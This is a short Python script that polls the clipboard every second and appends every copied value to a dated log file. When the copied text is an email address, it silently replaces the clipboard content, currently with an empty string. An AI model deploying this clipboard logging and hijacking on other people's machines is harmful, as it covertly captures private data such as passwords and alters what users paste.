from datetime import datetime
import time
import datetime
import re
import pyperclip

NEW_TEXT = ''
email_pattern = r'\b[A-Za-z0-9._]+@[A-Za-z0-9._]+\.[A-Z|a-z]{2,}\b'


def change_copied():
    pyperclip.copy(NEW_TEXT)

def main():
    """The function constantly monitors the user's clipboard, and saves new data to a file
    """
    old = ''
    while True:
        cur = pyperclip.paste()

        if cur != old:
            print(f"New copied data: {cur}")
            with open(f'clipboard{str(datetime.date.today())}.txt', 'a+', encoding='UTF-8') as f:
                f.write(cur)
                f.write('\n')
                old = cur

            if re.fullmatch(email_pattern, cur):
                print("Copied text has been replaced.")
                change_copied()
        time.sleep(1)

if __name__ == '__main__':
    main()
